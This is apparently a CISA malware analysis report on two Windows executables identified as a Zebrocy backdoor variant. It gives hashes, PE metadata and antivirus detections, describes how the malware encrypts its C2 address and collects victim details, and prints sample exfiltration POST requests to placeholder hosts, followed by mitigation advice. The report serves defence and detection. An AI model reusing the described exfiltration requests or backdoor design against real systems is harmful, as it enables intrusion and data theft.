The malware variant, known as Zebrocy, has been used by a sophisticated cyber actor. CISA and CNMF are distributing this MAR to enable network defense and reduced exposure to malicious activity. This MAR includes suggested response actions and recommended mitigation techniques.\n\nTwo Windows executables identified as a new variant of the Zebrocy backdoor were submitted for analysis. The file is designed to allow a remote operator to perform various functions on the compromised system.\n\nUsers or administrators should flag activity associated with the malware and report the activity to the CISA or the FBI Cyber Watch (CyWatch), and give the activity the highest priority for enhanced mitigation. For more information on malicious cyber activity, please visit https[:]//www[.]us-cert.gov.\nFor a downloadable copy of IOCs, see MAR-10310246-1.v1.\nSubmitted Files (2)\n0be114fe30ef5042890c17033b63d7c9e0363972fcc15a61433c598dd33f49d1 (smqft_exe)\n2631f95e9a46c821a701269a76b15bb065764cc15a0b268a4d1eac045975c9b8 (sespmw_exe)\n\nFindings\n\n0be114fe30ef5042890c17033b63d7c9e0363972fcc15a61433c598dd33f49d1\nTags\nbackdoor\nDetails\n\n\n\nName\nsmqft_exe\n\n\nSize\n4307968 bytes\n\n\nType\nPE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows\n\n\nMD5\nba9c59783b52b93aa6dfd4cfffc16f2b\n\n\nSHA1\nee6753448c3960e8f7ba325a2c00009c31615fd2\n\n\nSHA256\n0be114fe30ef5042890c17033b63d7c9e0363972fcc15a61433c598dd33f49d1\n\n\nSHA512\nbd9e059a9d8fc7deffd12908c01c7c53fbfa9af95296365aa28080d89a668e9eed9c2770ba952cf0174f464dc93e410c92dfdbbaa7bee9f4772affd0c55dee1c\n\n\nssdeep\n49152:vATdsrWzBmMmRytymPIcGkJGUAErdu5Pp6oUlMXH85jHuXJfZLJC23:gYYBmMdEsx5gDXgHuTLJ\n\n\nEntropy\n6.196940\n\n\n\nAntivirus\n\n\n\nBitDefender\nGen:Variant.Babar.17722\n\n\nEmsisoft\nGen:Variant.Babar.17722 (B)\n\n\nLavasoft\nGen:Variant.Babar.17722\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n1969-12-31 19:00:00-05:00\n\n\nImport Hash\n20acdf581665d0a5acf497c2fe5e0662\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\nb6114d2ef9c71d56d934ad743f66d209\nheader\n1024\n2.184050\n\n\n0ead1c8fd485e916e3564c37083fb754\n.text\n1952256\n6.048645\n\n\na5a4f98bad8aefba03b1fd8efa3e8668\n.data\n196096\n5.841971\n\n\n96bfb1a9a7e45816c45b7d7c1bf3c578\n.rdata\n2153984\n5.690400\n\n\n916cd27c0226ce956ed74ddf600a3a94\n.eh_fram\n1024\n4.244370\n\n\nd41d8cd98f00b204e9800998ecf8427e\n.bss\n0\n0.000000\n\n\n1f825370fd049566e1e933455eb0cd06\n.idata\n2560\n4.462264\n\n\n486c39eb96458f6f5bdb80d71bb0f828\n.CRT\n512\n0.118370\n\n\naa692f6a7441edad64447679b7d321e8\n.tls\n512\n0.224820\n\n\n\nDescription\nThis file is a 32-bit Windows executable written using Golang programming language. The file has been identified as a new variant of the Zebrocy backdoor. The file takes an argument that is supposed to be an Exclusive OR (XOR) and hexadecimal encoded Uniform Resource Identifier (URI) or it can run using a plaintext URI.\n\nDisplayed below is a sample plaintext argument used by the malware:\n\n--Begin arguments--\nDomain: malware.exe <Domain>\nor\nIP: malware.exe <IP address:Port>\n--End arguments--\n\nWhen executed, it will encrypt the URI using an Advanced Encryption Standard (AES)-128 Electronic Code Book (ECB) algorithm with a key generated from the victim's hostname. The encrypted data is hexadecimal encoded and stored into \"%AppData%\\Roaming\\Personalization\\EUDC\\Policies\\3030304332393839394630353537343934453244.\u201d\n\nIt also collects information about the victim\u2019s system such as username, 6 bytes of current user\u2019s Security Identifiers (SID), and time of infection. The data is encrypted and hexadecimal encoded before being exfiltrated using the predefined URI:\n\n--Begin POST requests--\n\n--Begin POST request sample--\nPOST / HTTP/1.1\nHost: www[.]<domain>.com\nUser-Agent: Go-http-client/1.1\nContent-Length: 297\nContent-Type: multipart/form-data; boundary=ac3d81244405bbbc958b22a748770ad10f9edd7be9946ccfd5b7bb1cc228\nAccept-Encoding: gzip\n\n--ac3d81244405bbbc958b22a748770ad10f9edd7be9946ccfd5b7bb1cc228\nContent-Disposition: form-data; name=\"filename\"; filename=\"04760175017f0d0d7f7706067302007f0573010204007134463136334635\"\nContent-Type: application/octet-stream\n\n1\n--ac3d81244405bbbc958b22a748770ad10f9edd7be9946ccfd5b7bb1cc228--\n--End POST request sample--\n\n--Begin POST request sample--\nPOST / HTTP/1.1\nHost: <IP address>:<Port>\nUser-Agent: Go-http-client/1.1\nContent-Length: 297\nContent-Type: multipart/form-data; boundary=44f47dd373e3a0a0afc00d92bba90bc09c7add1bcf4074de385fd04d1108\nAccept-Encoding: gzip\n\n--44f47dd373e3a0a0afc00d92bba90bc09c7add1bcf4074de385fd04d1108\nContent-Disposition: form-data; name=\"filename\"; filename=\"04760175017f0d0d7f7706067302007f0573010204007134463136334635\"\nContent-Type: application/octet-stream\n\n1\n--44f47dd373e3a0a0afc00d92bba90bc09c7add1bcf4074de385fd04d1108--\n--End POST request sample--\n\n--End POST requests--\n\nThe malware is designed to encrypt future communication using an AES encryption algorithm.\n\nThe malware allows a remote operator to perform the following functions:\n\n--Begin functions--\nFile manipulation such as creation, modification, and deletion\nScreenshot capabilities\nDrive enumeration\nCommand execution (using cmd.exe)\nCreate scheduled task for persistence\n--End functions--\n\n\n2631f95e9a46c821a701269a76b15bb065764cc15a0b268a4d1eac045975c9b8\nDetails\n\n\n\nName\nsespmw_exe\n\n\nSize\n4313600 bytes\n\n\nType\nPE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows\n\n\nMD5\ne8596fd7a15ecc86abbbfdea17a9e73a\n\n\nSHA1\nbe07f6a2c9d36a7e9c4d48f21e13e912e6271d83\n\n\nSHA256\n2631f95e9a46c821a701269a76b15bb065764cc15a0b268a4d1eac045975c9b8\n\n\nSHA512\n4a2125a26467ea4eb913abe80a59a85f3341531d634766fccabd14eb8ae1a3e7ee77162df7d5fac362272558db5a6e18f84ce193296fcdfb790e44a52fabe02a\n\n\nssdeep\n49152:J8IkRvcuFh9fQgnf/1th+jrR7PNrNdbMFvm6oUlMXycR+Z5drM0us4:UJHFh91fFg/+MX9RgY0u\n\n\nEntropy\n6.197768\n\n\n\nAntivirus\n\n\n\nBitDefender\nGen:Variant.Babar.17722\n\n\nEmsisoft\nGen:Variant.Babar.17722 (B)\n\n\nLavasoft\nGen:Variant.Babar.17722\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n1970-01-04 14:01:20-05:00\n\n\nImport Hash\n20acdf581665d0a5acf497c2fe5e0662\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n2ebbe6c38d9e8d4da2449cc05f78054a\nheader\n1024\n2.198390\n\n\na7c0885448e7013e05bf5ff61b673949\n.text\n1954816\n6.046127\n\n\n9bf966747acfa91eea3d6a1ef17cc30f\n.data\n196096\n5.843286\n\n\n31182660fce8ae07d0350ebe456b9179\n.rdata\n2157056\n5.696834\n\n\n9eeb1eeb42e99c54c6429f9122285336\n.eh_fram\n1024\n4.292769\n\n\nd41d8cd98f00b204e9800998ecf8427e\n.bss\n0\n0.000000\n\n\n0bc884e39b3ba72fb113d63988590b5c\n.idata\n2560\n4.424718\n\n\n9bbfafc74bc296cd99dc8307ffe120ac\n.CRT\n512\n0.114463\n\n\n2b60c482048e4a03fbb82db9c3416db5\n.tls\n512\n0.224820\n\n\n\nDescription\nThis file is a 32-bit Windows executable written using Golang programming language.

Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file header).\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, \"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".\n\nContact Information\n\n\n1-888-282-0870\nCISA Central\u00a0(UNCLASS)\nCISA SIPR (SIPRNET)\nCISA IC (JWICS)\n\nCISA continuously strives to improve its products and services.
